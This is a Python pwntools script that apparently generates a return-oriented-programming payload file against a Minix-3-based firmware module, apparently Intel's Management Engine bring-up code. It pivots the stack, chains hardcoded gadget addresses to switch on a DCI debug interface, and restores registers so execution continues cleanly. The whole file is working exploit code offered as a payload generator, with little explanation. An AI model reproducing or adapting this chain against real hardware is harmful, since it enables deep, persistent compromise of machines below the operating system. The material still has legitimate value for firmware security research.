#!/usr/bin/env python3

from pwn import *
from pwnlib.util.packing import u8, u16, u32, u64, p8, p16, p32, p64
import argparse

context.clear(arch="x86", bits=32, os="linux") #actually minx 3

# meh:
def gen_config():
    config  = b''
    config += p8(0x0)*6 # padding
    config += p16(0x1)  # entries only one as second is not needed

    # entry 1:
    config += p32(0xe0 | (0x2 << 24))  # offset + seg
    config += p32(0x5f000000)  # value

    # entry 2: not needed already 0x888888 there
    # config += p32(0x10 | (0x2 << 24))  # offset + seg
    # config += p32(0x00000888)  # value
    return config

# for sure:
STACK_BASE = 0x00056000
BUFFER_OFFSET = 0x380
RET_ADDR_OFFSET = 0x338
SYS_TRACER_CTX_OFFSET = 0x200

BUP_FILE_LEN = 0x328

SYSLIB_CTX_OFFSET = 0x10
SYS_TRACER_CTX_REQ_OFFSET = 0x55c58

pop_esp_ret = 0x00016e1a

# 0x0001a7f5: mov dword ptr [eax], edx; xor eax, eax; pop ebp; ret;

pop6 = 0x0000B578
# 0x0000B578: pop edx; pop ecx; pop ebx; pop esi; pop edi; pop ebp; ret;

def write_rop(where: int, what: int):
    rop  = b''

    rop += p32(pop6)  # Pop 6 arguments

    rop += p32(where)  # edx
    rop += p32(what)  # ecx
    rop += p32(0x00000000)*4  # ebx, esi, edi, ebp
    rop += p32(0x00009dcc)  # mov [edx], ecx + pop 3 arguments (Restores SYSLIB Context address)
    rop += p32(0x00000000)*3 #don't care
    return rop

def gen_rop_dci_enable():
    rop  = b''
    # activating DfX-agg
    rop += p32(0x0004a76c)  # side-band mapping
    rop += p32(0x0004a877)  # pop 2 arguments
    rop += p32(0x00070684)  # param 2
    rop += p32(0x00000100)  # param 1

    # setting personality
    rop += p32(0x000011BE)  # put_sel_word
    rop += p32(0x0004a876)  # pop 3 arguments
    rop += p32(0x0000019f)  # param 3
    rop += p32(0x00008400)  # param 2
    rop += p32(0x00000003)  # param 1

    # rop = p32(0x35022) * (len(rop)//4) # ret slide

    # rop += p32(0x0003d2b9)   # inf
    return rop

def gen_exit_strat():
    rop  = b''

    rop += p32(0x000011BE)  # put_sel_word
    rop += p32(0x0004a876)  # pop 3 arguments
    rop += p32(0x000000BF)  # param 3
    rop += p32(0x000000E0)  # param 2
    rop += p32(0x00000004 | 0x1000000)  # param 1

    # rop += p32(0x000011BE)  # put_sel_word
    # rop += p32(0x0004a876)  # pop 3 arguments
    # rop += p32(0x000000BF)  # param 3
    # rop += p32(0x00000010)  # param 2
    # rop += p32(0x88888888)  # param 1

    rop += write_rop(0x00055ff0, 0x00099010)
    rop += write_rop(0x00055fbc, 0x00000000)
    rop += write_rop(0x00055fb8, 0x00035674)
    rop += write_rop(0x00055ff4, 0x00000000)

    # rop += write_rop(0x00050008, 0x00049973)

    # v8 = 0x55fbc = ebp-0x10 = esp + 0x0, [v8] = 0x14
    # all regs: edx... eip doh
    #to restore esi = 1, esp = 0x55fbc, ebp = 0x55fac
    #not restore = eax, ebx, ecx

    rop += p32(pop6)

    rop += p32(0x1) #edx prob not needed
    rop += p32(0x0) #ecx
    rop += p32(0x0) #ebx
    rop += p32(0x1) #esi
    rop += p32(0x50004) #edi
    rop += p32(0x55fc0+0xc) #ebp

    rop += p32(pop_esp_ret)
    rop += p32(0x55fb8)

    return rop

def gen_rop():
    syslib_ctx_start = SYS_TRACER_CTX_REQ_OFFSET - SYS_TRACER_CTX_OFFSET

    rop = gen_config()
    init_trace_len = len(rop)
    rop += gen_rop_dci_enable()
    rop += gen_exit_strat()
    # 1st stage stack pivot ^

    rop = rop.ljust(RET_ADDR_OFFSET, p8(0x0))
    print(f"len rop: {hex(len(rop))}")
    rop += p32(pop_esp_ret)
    rop += p32(STACK_BASE - BUFFER_OFFSET + init_trace_len)
    print(f"len rop to context: {hex(len(rop))}")
    # stack pivot ^

    rop_tail  = b''

    rop_tail += p32(0x0096c64) #ebx/ end restore main regs
    rop_tail += p32(0x0000000)
    rop_tail += p32(0x0000000)
    rop_tail += p32(0x0055fd8) #main ebp
    rop_tail += p32(0x0035015) #ret bup_init_run_script
    rop_tail += p32(0x0000000)
    rop_tail += p32(0x0000000)

    rop_tail += p32(0x00260a1) # entry return addr

    rop_tail += p32(0x0000000)
    rop_tail += p32(0x0055ff0)
    rop_tail += p32(0x0055ff4)
    rop_tail += p32(0x0)
    rop_tail += p32(syslib_ctx_start)
    rop_tail += p32(0x0) #errno
    rop_tail += p32(0x03000300)
    rop_tail += p32(STACK_BASE-4)

    rop = rop.ljust(BUFFER_OFFSET - len(rop_tail), p8(0x0))

    print(f"rop before tail: {hex(len(rop))}")
    rop += rop_tail

    print(f"final rop len: {hex(len(rop))}")

    return rop

def ParseArguments():
    parser = argparse.ArgumentParser(description="hello")
    parser.add_argument('-f', metavar='<file name>', help='file name', type=str, default="ct.bin")
    return parser.parse_args().f

def main():
    file_name = ParseArguments()
    rop = gen_rop()
    print("[*] Saving to %s..." % (file_name))
    with open(file_name, "wb") as f:
        f.write(rop)

if __name__=="__main__":
    main()

# 01cf:0000000000055fb0: 00000000 00055fcc 0003565c 00000014
# 01cf:0000000000055fc0: 00096c64 00000000 00000000 00055fd8
# 01cf:0000000000055fd0: 00035015 00000000 00000000 000260a1
# 01cf:0000000000055fe0: 00000000 00055ff0 00055ff4 00000000
# 01cf:0000000000055ff0: 00099010 00000005 03000300 00055ffc
